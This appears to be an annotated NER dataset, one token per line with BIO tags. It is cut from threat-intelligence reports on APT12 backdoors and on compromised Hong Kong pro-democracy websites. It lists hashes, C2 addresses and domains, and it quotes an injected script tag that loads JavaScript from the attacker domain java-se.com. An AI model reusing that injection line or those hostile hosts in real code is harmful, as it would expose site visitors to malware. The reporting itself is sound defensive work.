steps	O
to	O
help	O
identify	O
intrusions	O
.	O
This	O
group	O
is	O
among	O
the	O
numerous	O
threat	O
actors	O
who	O
rely	O
almost	O
exclusively	O
on	O
Dynamic	O
DNS	O
infrastructure	O
.	O
They	O
seem	O
to	O
prefer	O
ChangeIP	O
(	O
https://www.changeip.com	O
/	O
services	O
/	O
free	O
-	O
dynamic	O
-	O
dns/(https://www.changeip.com	O
/	O
services	O
/	O
free-	O
dynamic	O
-	O
dns/	O
)	O
)	O
and	O
Afraid	O
(	O
https://freedns.afraid.org/(https://freedns.afraid.org/	O
)	O
)	O
for	O
free	O
DNS	O
services	O
,	O
although	O
they	O
previously	O
heavily	O
used	O
Sitelutions	O
(	O
https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns	O
)	O
)	O
.	O
While	O
there	O
are	O
some	O
legitimate	O
instances	O
of	O
dynamic	O
DNS	O
in	O
corporate	O
environments	O
,	O
it	O
only	O
accounts	O
for	O
a	O
small	O
percentage	O
of	O
traffic	O
.	O
Monitoring	O
and/or	O
blocking	O
dynamic	O
DNS	O
requests	O
should	O
help	O
detect	O
attacks	O
by	O
this	O
actor	O
.	O
Any	O
dynamic	O
DNS	O
domains	O
that	O
resolve	O
to	O
non	O
-	O
routable	O
IP	O
addresses	O
,	O
like	O
127.0.0.1	O
or	O
private	O
IP	O
addresses	O
,	O
should	O
be	O
thoroughly	O
investigated	O
.	O
The	O
HTTP	O
traffic	O
generated	O
by	O
both	O
samples	O
uses	O
a	O
limited	O
number	O
of	O
header	O
fields	O
,	O
which	O
is	O
substantially	O
different	O
from	O
the	O
majority	O
of	O
traffic	O
generated	O
by	O
modern	O
browsers	O
.	O
As	O
always	O
,	O
do	O
n't	O
open	O
E	O
-	O
mail	O
attachments	O
from	O
untrusted	O
parties	O
.	O
The	O
attackers	O
referred	O
to	O
as	O
APT12	O
(	O
also	O
known	O
as	O
IXESHE	O
,	O
DynCalc	O
,	O
and	O
DNSCALC	O
)	O
recently	O
started	O
a	O
new	O
campaign	O
targeting	O
organizations	O
in	O
Japan	O
and	O
Taiwan	O
.	O
APT12	O
is	O
believed	O
to	O
be	O
a	O
cyber	O
espionage	O
group	O
thought	O
to	O
have	O
links	O
to	O
the	O
Chinese	O
People	O
's	O
Liberation	O
Army	O
.	O
APT12′s	O
targets	O
are	O
consistent	O
with	O
larger	O
People	O
's	O
Republic	O
of	O
China	O
(	O
PRC	O
)	O
goals	O
.	O
Intrusions	O
and	O
campaigns	O
conducted	O
by	O
this	O
group	O
are	O
in-	O
line	O
with	O
PRC	O
goals	O
and	O
self	O
-	O
interest	O
in	O
Taiwan	O
.	O
Additionally	O
,	O
the	O
new	O
campaigns	O
we	O
uncovered	O
further	O
highlight	O
the	O
correlation	O
between	O
APT	O
groups	O
ceasing	O
and	O
retooling	O
operations	O
after	O
media	O
exposure	O
,	O
as	O
APT12	O
used	O
the	O
same	O
strategy	O
after	O
compromising	O
the	O
New	O
York	O
Times	O
in	O
Oct	O
2012	O
.	O
Much	O
like	O
Darwin	O
's	O
theory	O
of	O
biological	O
evolution	O
,	O
APT12	O
been	O
forced	O
to	O
evolve	O
and	O
adapt	O
in	O
order	O
to	O
maintain	O
its	O
mission	O
.	O
The	O
new	O
campaign	O
marks	O
the	O
first	O
APT12	O
activity	O
publicly	O
reported	O
since	O
Arbor	O
Networks	O
released	O
their	O
blog	O
"	O
Illuminating	O
The	O
Etumbot	O
APT	O
Backdoor	O
.	O
"	O
FireEye	O
refers	O
to	O
the	O
Etumbot	O
backdoor	O
as	O
RIPTIDE	O
.	O
Since	O
the	O
release	O
of	O
the	O
Arbor	O
blog	O
post	O
,	O
FireEye	O
has	O
observed	O
APT12	O
use	O
a	O
modified	O
RIPTIDE	O
backdoor	O
that	O
we	O
call	O
HIGHTIDE	O
.	O
This	O
is	O
the	O
second	O
time	O
FireEye	O
has	O
discovered	O
APT12	O
retooling	O
after	O
a	O
public	O
disclosure	O
.	O
As	O
such	O
,	O
FireEye	O
believes	O
this	O
to	O
be	O
a	O
common	O
theme	O
for	O
this	O
APT	O
group	O
,	O
as	O
APT12	O
will	O
continue	O
to	O
evolve	O
in	O
an	O
effort	O
to	O
avoid	O
detection	O
and	O
continue	O
its	O
cyber	O
operations	O
.	O
FireEye	O
researchers	O
also	O
discovered	O
two	O
possibly	O
related	O
campaigns	O
utilizing	O
two	O
other	O
backdoors	O
known	O
as	O
THREEBYTE	O
and	O
WATERSPOUT	O
.	O
Both	O
backdoors	O
were	O
dropped	B-Action
from	O
malicious	O
documents	B-Entity
built	I-Entity
utilizing	I-Entity
the	I-Entity
"	I-Entity
Tran	I-Entity
Duy	I-Entity
Linh	I-Entity
"	I-Entity
exploit	I-Entity
kit	I-Entity
,	O
which	O
exploited	O
CVE-2012	O
-	O
0158	O
.	O
These	O
documents	O
were	O
also	O
emailed	O
to	O
organizations	O
in	O
Japan	O
and	O
Taiwan	O
.	O
While	O
APT12	O
has	O
previously	O
used	O
THREEBYTE	O
,	O
it	O
is	O
unclear	O
if	O
APT12	O
was	O
responsible	O
for	O
the	O
recently	O
discovered	O
campaign	O
utilizing	O
THREEBYTE	O
.	O
Similarly	O
,	O
WATERSPOUT	O
is	O
a	O
newly	O
discovered	O
backdoor	O
and	O
the	O
threat	O
actors	O
behind	O
the	O
campaign	O
have	O
not	O
been	O
positively	O
identified	O
.	O
However	O
,	O
the	O
WATERSPOUT	O
campaign	O
shared	O
several	O
traits	O
with	O
the	O
RIPTIDE	O
and	O
HIGHTIDE	O
campaign	O
that	O
we	O
have	O
attributed	O
to	O
APT12	O
.	O
From	O
October	O
2012	O
to	O
May	O
2014	O
,	O
FireEye	O
observed	O
APT12	O
utilizing	O
RIPTIDE	O
,	O
a	O
proxy	O
-	O
aware	O
backdoor	O
that	O
communicates	B-Action
via	B-Modifier
HTTP	B-Entity
to	B-Modifier
a	O
hard	B-Entity
-	I-Entity
coded	I-Entity
command	I-Entity
and	I-Entity
control	I-Entity
(	I-Entity
C2	I-Entity
)	I-Entity
server	I-Entity
.	O
RIPTIDE	O
's	O
first	O
communication	O
with	O
its	O
C2	O
server	O
fetches	O
an	O
encryption	O
key	O
,	O
and	O
the	O
RC4	O
encryption	O
key	O
is	O
used	O
to	O
encrypt	O
all	O
further	O
communication	O
.	O
In	O
June	O
2014	O
,	O
Arbor	O
Networks	O
published	O
an	O
article	O
describing	O
the	O
RIPTIDE	O
backdoor	O
and	O
its	O
C2	O
infrastructure	O
in	O
great	O
depth	O
.	O
The	O
blog	O
highlighted	O
that	O
the	O
backdoor	O
was	O
utilized	O
in	O
campaigns	O
from	O
March	O
2011	O
till	O
May	O
2014	O
.	O
Following	O
the	O
release	O
of	O
the	O
article	O
,	O
FireEye	O
observed	O
a	O
distinct	O
change	O
in	O
RIPTIDE	O
's	O
protocols	O
and	O
strings	O
.	O
We	O
suspect	O
this	B-Entity
change	I-Entity
was	O
a	O
direct	O
result	O
of	O
the	O
Arbor	O
blog	O
post	O
in	O
order	O
to	O
decrease	O
detection	O
of	O
RIPTIDE	O
by	O
security	O
vendors	O
.	O
The	O
changes	O
to	O
RIPTIDE	O
were	O
significant	O
enough	O
to	O
circumvent	O
existing	O
RIPTIDE	O
detection	O
rules	O
.	O
FireEye	O
dubbed	O
this	O
new	O
malware	O
family	O
HIGHTIDE	O
.	O
On	O
Sunday	O
August	O
24	O
,	O
2014	O
we	O
observed	O
a	B-Entity
spear	I-Entity
phish	I-Entity
email	I-Entity
sent	B-Action
to	B-Modifier
a	O
Taiwanese	B-Entity
government	I-Entity
ministry	I-Entity
.	O
Attached	O
to	O
this	O
email	O
was	O
a	O
malicious	O
Microsoft	O
Word	O
document	O
(	O
MD5	O
:	O
f6fafb7c30b1114befc93f39d0698560	O
)	O
that	O
exploited	O
CVE-2012	O
-	O
0158	O
.	O
It	O
is	O
worth	O
noting	O
that	O
this	O
email	O
appeared	O
to	O
have	O
been	O
sent	O
from	O
another	O
Taiwanese	O
Government	O
employee	O
,	O
implying	O
that	O
the	O
email	O
was	O
sent	O
from	O
a	O
valid	O
but	O
compromised	O
account	O
.	O
The	O
exploit	B-Entity
document	O
dropped	O
the	O
HIGHTIDE	B-Entity
backdoor	I-Entity
with	O
the	O
following	O
properties	O
.	O
The	O
HIGHTIDE	O
backdoor	O
connected	O
directly	O
to	O
141.108.2.157	O
.	O
If	O
you	O
compare	O
the	O
HTTP	O
GET	O
request	O
from	O
the	O
RIPTIDE	O
samples	O
(	O
Figure	O
1	O
)	O
to	O
the	O
HTTP	O
GET	O
request	O
from	O
the	O
HIGHTIDE	O
samples	O
(	O
Figure	O
3	O
)	O
you	O
can	O
see	O
the	O
malware	O
author	O
changed	O
the	O
following	O
items	O
.	O
User	O
Agent	O
Format	O
and	O
structure	O
of	O
the	O
HTTP	O
Uniform	O
Resource	O
Identifier	O
(	O
URI	O
)	O
Similar	O
to	O
RIPTIDE	O
campaigns	O
,	O
APT12	O
infects	O
target	O
systems	O
with	O
HIGHTIDE	O
using	O
a	O
Microsoft	O
Word	O
(	O
.doc	O
)	O
document	O
that	O
exploits	O
CVE-2012	O
-	O
0158	O
.	O
FireEye	O
observed	O
APT12	B-Entity
deliver	I-Entity
these	B-Entity
exploit	I-Entity
documents	I-Entity
via	B-Modifier
phishing	O
emails	O
in	O
multiple	O
cases	O
.	O
Based	O
on	O
past	O
APT12	O
activity	O
,	O
we	O
expect	O
the	B-Entity
threat	I-Entity
group	I-Entity
to	O
continue	O
to	O
utilize	O
phishing	O
as	O
a	O
malware	O
delivery	O
method	O
.	O
When	O
the	O
file	O
is	O
opened	O
,	O
it	B-Entity
drops	B-Action
HIGHTIDE	B-Entity
in	O
the	O
form	O
of	O
an	O
executable	O
file	O
onto	O
the	O
infected	O
system	O
.	O
RIPTIDE	O
and	O
HIGHTIDE	O
differ	O
on	O
several	O
points	O
:	O
executable	O
file	O
location	O
,	O
image	O
base	O
address	O
,	O
the	O
User-	O
Agent	O
within	O
the	O
GET	O
requests	O
,	O
and	O
the	O
format	O
of	O
the	O
URI	O
.	O
The	O
RIPTIDE	B-Entity
exploit	I-Entity
document	I-Entity
drops	B-Action
its	I-Action
executable	B-Entity
file	I-Entity
into	O
the	O
C:\Documents	O
and	O
Settings\{user}\Application	O
Data\Location	O
folder	O
while	O
the	B-Entity
HIGHTIDE	I-Entity
exploit	I-Entity
document	I-Entity
drops	B-Action
its	I-Action
executable	B-Entity
file	I-Entity
into	O
the	O
C:\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user}\LOCAL	O
SETTINGS\Temp\	O
folder	O
.	O
All	O
but	O
one	O
sample	O
that	O
we	O
identified	O
were	O
written	O
to	O
this	O
folder	O
as	O
word.exe	O
.	O
The	O
one	O
outlier	O
was	O
written	O
as	O
winword.exe	O
.	O
Research	O
into	O
this	O
HIGHTIDE	O
campaign	O
revealed	O
APT12	O
targeted	O
multiple	O
Taiwanese	O
Government	O
organizations	O
between	O
August	O
22	O
and	O
28	O
.	O
On	O
Monday	O
August	O
25	O
,	O
2014	O
we	O
observed	O
a	B-Entity
different	I-Entity
spear	I-Entity
phish	I-Entity
email	I-Entity
sent	B-Action
from	B-Modifier
lilywang823@gmail.com	B-Entity
to	B-Modifier
a	O
technology	B-Entity
company	I-Entity
located	I-Entity
in	I-Entity
Taiwan	I-Entity
.	O
This	O
spear	B-Entity
phish	I-Entity
contained	O
a	O
malicious	B-Entity
Word	I-Entity
document	I-Entity
that	I-Entity
exploited	I-Entity
CVE-2012	I-Entity
-	I-Entity
0158	I-Entity
.	O
The	O
MD5	O
of	O
the	O
exploit	O
document	O
was	O
e009b95ff7b69cbbebc538b2c5728b11	O
.	O
Similar	O
to	O
the	O
newly	O
discovered	O
HIGHTIDE	O
samples	O
documented	O
above	O
,	O
this	B-Entity
malicious	I-Entity
document	I-Entity
dropped	B-Action
a	O
backdoor	O
to	O
C:\DOCUMENTS	O
and	O
SETTINGS\{user}\LOCAL	O
SETTINGS\Temp\word.exe	O
.	O
This	O
backdoor	O
had	O
the	O
following	O
properties	O
.	O
This	O
backdoor	O
sent	O
the	O
following	O
callback	O
traffic	O
to	O
video[.]csmcpr[.]com	O
.	O
The	O
THREEBYTE	O
spear	O
phishing	O
incident	O
(	O
while	O
not	O
yet	O
attributed	O
)	O
shared	O
the	O
following	O
characteristics	O
with	O
the	O
above	O
HIGHTIDE	O
campaign	O
attributed	O
to	O
APT12	O
.	O
On	O
August	O
25	O
,	O
2014	O
,	O
we	O
observed	O
another	O
round	O
of	O
spear	B-Entity
phishing	I-Entity
emails	I-Entity
targeting	O
a	O
high	B-Entity
-	I-Entity
technology	I-Entity
company	I-Entity
in	I-Entity
Japan	I-Entity
.	O
Attached	O
to	O
this	O
email	O
was	B-Action
another	B-Entity
malicious	I-Entity
document	I-Entity
that	O
was	O
designed	O
to	O
exploit	O
CVE-2012	O
-	O
0158	O
.	O
This	O
malicious	B-Entity
Word	I-Entity
document	I-Entity
had	O
an	O
MD5	O
of	O
499bec15ac83f2c8998f03917b63652e	O
and	O
dropped	O
a	O
backdoor	O
to	O
C:\DOCUMENTS	O
and	O
SETTINGS\{user}\LOCAL	O
SETTINGS\Temp\word.exe	O
.	O
The	O
backdoor	O
had	O
the	O
following	O
properties	O
.	O
The	O
backdoor	O
connects	O
to	O
a	O
command	O
and	O
control	O
server	O
at	O
icc[.]ignorelist[.]com	O
.	O
Similar	O
to	O
RIPTIDE	O
and	O
HIGHTIDE	O
,	O
the	O
WATERSPOUT	O
backdoor	O
is	O
an	B-Entity
HTTP	I-Entity
-	I-Entity
based	I-Entity
backdoor	I-Entity
that	O
communicates	B-Action
with	O
its	O
C2	B-Entity
server	I-Entity
.	O
Although	O
there	O
are	O
no	O
current	O
infrastructure	O
ties	O
to	O
link	O
this	O
backdoor	O
to	O
APT12	O
,	O
there	O
are	O
several	O
data	O
points	O
that	O
show	O
a	O
possible	O
tie	O
to	O
the	O
same	O
actors	O
.	O
Although	O
these	O
points	O
do	O
not	O
definitively	O
tie	O
WATERSPOUT	O
to	O
APT12	O
,	O
they	O
do	O
indicate	O
a	O
possible	O
connection	O
between	O
the	O
WATERSPOUT	O
campaign	O
,	O
the	O
THREEBYTE	O
campaign	O
,	O
and	O
the	O
HIGHTIDE	O
campaign	O
attributed	O
to	O
APT12	O
.	O
FireEye	O
believes	O
the	O
change	O
from	O
RIPTIDE	O
to	O
HIGHTIDE	O
represents	O
a	O
temporary	O
tool	O
shift	O
to	O
decrease	O
malware	O
detection	O
while	O
APT12	O
developed	O
a	O
completely	O
new	O
malware	O
toolset	O
.	O
These	O
development	O
efforts	O
may	O
have	O
resulted	O
in	O
the	O
emergence	O
of	O
the	O
WATERSPOUT	O
backdoor	O
.	O
APT12	O
's	O
adaptations	O
to	O
public	O
disclosures	O
lead	O
FireEye	O
to	O
make	O
several	O
conclusions	O
about	O
this	O
threat	O
group	O
.	O
Though	O
public	O
disclosures	O
resulted	O
in	O
APT12	O
adaptations	O
,	O
FireEye	O
observed	O
only	O
a	O
brief	O
pause	O
in	O
APT12	O
activity	O
before	O
the	O
threat	O
actors	O
returned	O
to	O
normal	O
activity	O
levels	O
.	O
Similarly	O
,	O
the	O
public	O
disclosure	O
of	O
APT12	O
's	O
intrusion	O
at	O
the	O
New	O
York	O
Times	O
also	O
led	O
to	O
only	O
a	O
brief	O
pause	O
in	O
the	O
threat	O
group	O
's	O
activity	O
and	O
immediate	O
changes	O
in	O
TTPs	O
.	O
The	O
pause	O
and	O
retooling	O
by	O
APT12	O
was	O
covered	O
in	O
the	O
Mandiant	O
2014	O
M-	O
Trends	O
report	O
.	O
Currently	O
,	O
APT12	O
continues	O
to	O
target	O
organizations	O
and	O
conduct	O
cyber	O
operations	O
using	O
its	O
new	O
tools	O
.	O
Most	O
recently	O
,	O
FireEye	O
observed	O
HIGHTIDE	O
at	O
multiple	O
Taiwan	O
-	O
based	O
organizations	O
and	O
the	O
suspected	O
APT12	O
WATERSPOUT	O
backdoor	O
at	O
a	O
Japan	O
-	O
based	O
electronics	O
company	O
.	O
We	O
expect	O
that	O
APT12	O
will	O
continue	O
their	O
trend	O
and	O
evolve	O
and	O
change	O
its	O
tactics	O
to	O
stay	O
ahead	O
of	O
network	O
defenders	O
.	O
Note	O
:	O
IOCs	O
for	O
this	O
campaign	O
can	O
be	O
found	O
here	O
.	O
This	O
entry	O
was	O
posted	O
in	O
Botnets	O
,	O
Targeted	O
Attack	O
,	O
Threat	O
Intelligence	O
,	O
Threat	O
Research	O
and	O
tagged	O
advanced	O
malware	O
,	O
advanced	O
persistent	O
threat	O
,	O
advanced	O
targeted	O
attack	O
,	O
advanced	O
threat	O
actor	O
,	O
APT12	O
,	O
Targeted	O
Attack	O
by	O
Ned	O
Moran	O
,	O
Mike	O
Oppenheim	O
,	O
Sarah	O
Engle	O
and	O
Richard	O
Wartell	O
.	O
Bookmark	O
the	O
permalink	O
.	O
Posted	O
on	O
October	O
9	O
,	O
2014	O
by	O
Steven	O
Adair	O
Over	O
the	O
last	O
few	O
months	O
,	O
Volexity	O
has	O
been	O
tracking	O
a	O
particularly	O
remarkable	O
advanced	O
persistent	O
threat	O
(	O
APT	O
)	O
operation	O
involving	O
strategic	O
web	O
compromises	O
of	O
websites	O
in	O
Hong	O
Kong	O
and	O
Japan	O
.	O
In	O
both	O
countries	O
,	O
the	O
compromised	O
websites	O
have	O
been	O
particularly	O
notable	O
for	O
their	O
relevance	O
to	O
current	O
events	O
and	O
the	O
high	O
profile	O
nature	O
of	O
the	O
organizations	O
involved	O
.	O
In	O
particular	O
the	O
Hong	O
Kong	O
compromises	O
appear	O
to	O
come	O
on	O
the	O
heels	O
of	O
the	O
Occupy	O
Central	O
Campaign	O
shifting	O
into	O
high	O
gear	O
.	O
These	O
compromises	O
were	O
discovered	O
following	O
the	O
identification	O
of	O
malicious	B-Entity
JavaScript	I-Entity
that	O
had	O
been	O
added	B-Action
to	B-Modifier
legitimate	O
code	O
on	O
the	O
impacted	O
websites	O
.	O
This	O
code	O
meant	O
that	O
visitors	O
were	O
potentially	O
subjected	O
to	O
exploit	O
and	O
malicious	B-Entity
Java	I-Entity
Applets	I-Entity
designed	O
to	O
install	O
malware	O
on	O
their	O
systems	O
.	O
While	O
investigating	O
these	O
cases	O
,	O
Volexity	O
also	O
discovered	O
additional	O
APT	O
attack	O
campaigns	O
involving	O
multiple	O
other	O
pro	O
-	O
democratic	O
websites	O
in	O
Hong	O
Kong	O
.	O
These	O
attempts	O
at	O
exploitation	O
,	O
compromise	O
,	O
and	O
digital	O
surveillance	O
are	O
detailed	O
throughout	O
this	O
post	O
.	O
Warning	O
:	O
Many	O
of	O
these	O
websites	O
may	O
still	O
be	O
compromised	O
and	O
present	O
a	O
risk	O
to	O
visitors	O
.	O
Browse	O
with	O
caution	O
.	O
Alliance	O
for	O
True	O
Democracy	O
€	O
"	O
Hong	O
Kong	O
Over	O
the	O
last	O
two	O
days	O
,	O
Volexity	O
has	O
observed	O
malicious	B-Entity
code	I-Entity
being	I-Entity
served	B-Action
up	I-Action
from	B-Modifier
the	O
website	B-Entity
of	I-Entity
the	I-Entity
Alliance	I-Entity
for	I-Entity
True	I-Entity
Democracy	I-Entity
(	I-Entity
ATD	I-Entity
)	I-Entity
in	I-Entity
Hong	I-Entity
Kong	I-Entity
(	O
www.atd.hk	O
)	O
.	O
ATD	O
is	O
an	O
alliance	O
of	O
people	O
and	O
organizations	O
dedicated	O
to	O
democracy	O
and	O
universal	O
suffrage	O
in	O
Hong	O
Kong	O
.	O
At	O
the	O
time	O
of	O
this	O
writing	O
malicious	O
code	O
is	O
still	O
live	O
on	O
the	O
website	O
,	O
so	O
please	O
visit	O
with	O
care	O
until	O
the	O
website	O
is	O
clean	O
.	O
Below	O
is	O
a	O
screen	O
shot	O
of	O
the	O
malicious	O
code	O
references	O
found	O
pre	O
-	O
pended	O
to	O
a	O
JavaScript	O
file	O
on	O
the	O
website	O
named	O
superfish.js	O
.	O
This	O
JavaScript	O
file	O
is	O
called	O
from	O
other	O
parts	O
of	O
the	O
website	O
and	O
effectively	O
nests	O
the	O
loading	O
of	O
additional	O
JavaScript	O
written	O
and	O
interpeted	O
as	O
.	O
<	O
script	O
language	O
=	O
javascript	O
src	O
=	O
http://java	O
-	O
se.com	O
/	O
o.js</script	O
>	O
The	O
domain	O
name	O
java-se.com	O
is	O
known	O
bad	O
and	O
associated	O
with	O
APT	O
activity	O
.	O
At	O
the	O
time	O
of	O
this	O
post	O
,	O
the	O
domain	O
is	O
hosted	O
on	O
the	O
Japanese	O
IP	O
address	O
210.253.101.105	O
.	O
7506	O
|	O
210.253.96.0/20	O
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O
Volexity	O
has	O
yet	O
to	O
actually	O
see	O
the	O
contents	O
of	O
the	O
file	O
o.js	O
,	O
as	O
the	O
websites	O
has	O
continuously	O
returned	O
HTTP	O
403	O
responses	O
each	O
time	O
it	O
was	O
requested	O
.	O
The	O
file	O
was	O
requested	O
from	O
IP	O
addresses	O
throughout	O
Asia	O
without	O
ever	O
returning	O
valid	O
content	O
.	O
It	O
€	O
™s	O
unclear	O
if	O
this	O
code	O
is	O
activated	O
at	O
certain	O
times	O
or	O
if	O
there	O
is	O
a	O
whitelist	O
of	O
IPs	O
restricting	O
access	O
to	O
the	O
file	O
to	O
specific	O
targets	O
.	O
This	O
same	O
code	O
has	O
also	O
been	O
observed	O
being	O
served	O
from	O
another	O
Hong	O
Kong	O
website	O
described	O
in	O
the	O
next	O
section	O
.	O
While	O
examining	O
the	O
ATD	O
website	O
,	O
Volexity	O
also	O
observed	O
that	O
the	O
site	O
had	O
a	B-Entity
password	I-Entity
protected	I-Entity
backdoor	I-Entity
webshell	I-Entity
placed	B-Action
on	B-Modifier
it	B-Entity
.	O
This	O
is	O
a	O
fairly	O
popular	O
webshell	O
that	O
Volexity	O
has	O
encountered	O
on	O
several	O
occasions	O
when	O
dealing	O
with	O
website	O
compromises	O
.	O
Volexity	O
refers	O
to	O
this	O
shell	O
as	O
the	O
Angel	O
Webshell	O
,	O
named	O
after	O
its	O
default	O
password	O
of	O
€	O
œangel	O
€	O
​.	O
The	O
shell	O
will	O
simply	O
display	O
the	O
text	O
€	O
œPassword	O
:	O
€	O
​	O
,	O
a	O
text	O
input	O
box	O
,	O
and	O
a	O
Login	O
button	O
.	O
A	O
screen	O
shot	O
of	O
the	O
webshell	O
as	O
observed	O
on	O
the	O
ATD	O
website	O
can	O
be	O
seen	O
below	O
.	O
Despite	O
the	O
shell	O
being	O
written	O
in	O
PHP	O
and	O
only	O
displaying	O
a	O
simple	O
Login	O
prompt	O
,	O
it	O
is	O
easy	O
to	O
identify	O
the	O
Angel	O
webshell	O
based	O
on	O
unique	O
components	O
of	O
its	O
viewable	O
HTML	O
source	O
code	O
.	O
The	O
HTML	O
source	O
of	O
this	O
page	O
is	O
displayed	O
in	O
the	O
following	O
image	O
.	O
While	O
Volexity	O
operates	O
under	O
the	O
assumption	O
attackers	O
have	O
placed	O
webshells	O
on	O
webservers	O
they	O
have	O
compromised	O
,	O
in	O
this	O
particular	O
instance	O
it	O
can	O
be	O
seen	O
with	O
certainty	O
.	O
Attackers	B-Entity
will	O
often	O
upload	B-Action
new	I-Action
webshells	B-Entity
or	I-Entity
add	I-Entity
simple	I-Entity
China	I-Entity
Chopper	I-Entity
style	I-Entity
modifications	I-Entity
to	B-Modifier
legitimate	O
existing	O
files	O
in	O
an	O
attempt	O
to	O
maintain	O
persistence	O
to	O
these	O
systems	O
.	O
In	O
the	O
last	O
week	O
,	O
Volexity	O
also	O
observed	O
both	O
the	O
English	O
and	O
Chinese	O
language	O
websites	O
for	O
the	O
Democratic	O
Party	O
Hong	O
Kong	O
compromised	O
with	O
the	O
same	O
malicious	O
code	O
found	O
ont	O
he	O
ATD	O
website	O
(	O
www.dphk.org	O
|	O
eng.dphk.org	O
)	O
.	O
DPHK	O
is	O
a	O
pro	O
-	O
democracy	O
political	O
party	O
in	O
Hong	O
Kong	O
.	O
Like	O
the	O
ATD	O
website	O
,	O
at	O
the	O
time	O
of	O
this	O
writing	B-Action
the	B-Entity
DPHK	I-Entity
websites	I-Entity
are	O
also	O
serving	B-Action
up	I-Action
malicious	O
code	O
,	O
so	O
please	O
browse	O
with	O
caution	O
.	O
During	O
our	O
research	O
for	O
this	O
post	O
,	O
we	O
also	O
became	O
aware	O
of	O
multiple	O
public	O
reports	O
related	O
to	O
the	O
compromise	O
of	O
the	O
DPHK	O
website	O
on	O
both	O
Twitter	O
and	O
via	O
ThreatConnect	O
.	O
Our	O
good	O
friend	O
Claudio	O
Giurianeri	O
posted	O
the	O
following	O
tweet	O
on	O
October	O
3	O
,	O
2014	O
The	O
website	O
of	O
the	O
Democratic	O
Party	O
of	O
Hong	O
Kong	O
has	O
been	O
compromised	O
and	O
still	O
is	O
.	O
Let	O
them	O
know	O
.	O
#	O
OccupyCentral	O
Diving	O
further	O
into	O
some	O
of	O
the	O
replies	O
to	O
this	O
tweet	O
is	O
a	O
plethora	O
of	O
information	O
regarding	O
the	O
exploit	O
domain	O
java-se.com	O
.	O
In	O
particular	O
,	O
a	O
tweet	O
from	O
Brandon	O
Dixon	O
with	O
relevant	O
data	O
from	O
the	O
PassiveTotal	O
project	O
details	O
several	O
subdomains	O
and	O
IP	O
addresses	O
associated	O
with	O
java-se.com	O
.	O
While	O
Volexity	O
has	O
only	O
observed	O
a	O
handful	O
of	O
the	O
hostnames	O
in	O
the	O
wild	O
thus	O
far	O
,	O
other	O
active	O
subdomains	O
suggest	O
there	O
could	O
be	O
additional	O
on	O
-	O
going	O
exploit	O
or	O
malware	O
activity	O
from	O
the	O
domain	O
.	O
Additional	O
reporting	O
on	O
this	O
activity	O
and	O
another	O
going	O
back	O
to	O
August	O
2014	O
was	O
also	O
recently	O
shared	O
on	O
ThreatConnect	O
.	O
Despite	O
all	O
of	O
this	O
attention	O
,	O
the	O
DPHK	O
website	O
is	O
still	O
compromised	O
and	O
references	O
the	O
JavaScript	O
from	O
the	O
hostile	O
domain	O
.	O
It	O
is	O
also	O
worth	O
noting	O
that	O
this	O
is	O
not	O
the	O
first	O
time	O
that	O
the	B-Entity
DPHK	I-Entity
website	I-Entity
has	O
been	B-Action
used	I-Action
in	O
a	O
strategic	O
web	O
compromise	O
.	O
Back	O
in	O
May	O
2011	O
,	O
Kaspersky	O
Lab	O
reported	O
the	B-Entity
website	I-Entity
was	O
being	B-Action
leveraged	I-Action
to	B-Modifier
target	I-Modifier
users	B-Entity
with	I-Entity
Flash	I-Entity
Exploits	I-Entity
.	O
The	O
DPHK	O
appears	O
to	O
be	O
of	O
high	O
value	O
with	O
respect	O
to	O
targeting	O
visitors	O
.	O
During	O
the	O
course	O
of	O
investigating	O
activity	O
related	O
to	O
the	O
ATD	O
and	O
DPHK	O
websites	O
,	O
Volexity	O
also	O
observed	O
that	O
the	B-Entity
website	I-Entity
of	I-Entity
the	I-Entity
political	I-Entity
coalition	I-Entity
and	I-Entity
pan	I-Entity
-	I-Entity
democratic	I-Entity
organization	I-Entity
People	I-Entity
Power	I-Entity
in	I-Entity
Hong	I-Entity
Kong	I-Entity
(	I-Entity
www.peoplepower.hk	I-Entity
)	O
had	O
been	B-Action
compromised	I-Action
as	O
well	O
.	O
However	O
,	O
unlike	O
the	O
other	O
two	O
websites	O
,	O
the	O
People	O
Power	O
website	O
did	O
not	O
contain	O
JavaScript	O
modifications	O
pointing	O
to	O
java-	O
se.com	O
.	O
Instead	O
the	O
website	O
appears	O
to	O
have	O
malicious	O
iFrames	O
leveraging	O
the	O
Chinese	O
URL	O
shortener	O
985.so	O
.	O
At	O
the	O
bottom	O
of	O
several	O
of	O
the	O
pages	O
for	O
the	O
People	O
Power	O
website	O
are	O
four	O
iFrames	O
as	O
seen	O
in	O
this	O
screen	O
shot	O
of	O
the	O
website	O
source	O
.	O
Those	O
links	O
,	O
with	O
the	O
exception	O
of	O
the	O
first	O
one	O
,	O
all	O
redirect	O
to	O
exploit	O
pages	O
on	O
the	O
Hong	O
Kong	O
IP	O
address	O
58.64.178.77	O
.	O
These	O
pages	O
load	O
scripts	O
that	O
conduct	B-Action
profiling	B-Entity
of	O
the	O
system	B-Entity
for	I-Entity
various	I-Entity
software	I-Entity
,	I-Entity
plugins	I-Entity
,	I-Entity
and	I-Entity
other	I-Entity
related	I-Entity
information	I-Entity
,	O
as	O
well	O
as	O
load	B-Action
Java	B-Entity
exploits	I-Entity
designed	I-Entity
to	O
install	B-Action
malware	B-Entity
on	O
the	O
target	B-Entity
system	I-Entity
.	O
If	O
successful	O
,	O
the	B-Entity
exploits	I-Entity
will	O
install	O
either	O
a	B-Entity
32-bit	I-Entity
or	I-Entity
64-bit	I-Entity
version	I-Entity
of	I-Entity
the	I-Entity
malware	I-Entity
.	O
Both	O
files	O
are	O
found	O
within	O
the	O
Java	O
Archives	O
files	O
.	O
Below	O
are	O
details	O
on	O
each	O
of	O
the	O
malware	O
files	O
.	O
Filename	O
:	O
main.dll	O
File	O
size	O
:	O
13824	O
bytes	O
MD5	O
hash	O
:	O
1befa2c2d1bfc8e87d52871c868f75fe	O
SHA1	O
hash	O
:	O
8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817	O
Notes	O
:	O
32-bit	O
version	O
of	O
malware	O
,	O
which	O
beacons	O
to	O
58.64.178.77:443	O
.	O
Filename	O
:	O
main64.dll	O
File	O
size	O
:	O
15872	O
bytes	O
MD5	O
hash	O
:	O
a482a84d13c76b950ce5bc7e75f4edef	O
SHA1	O
hash	O
:	O
c0a4b9145e0066f5c1534beddc9c666ea8eb0882	O
Notes	O
:	O
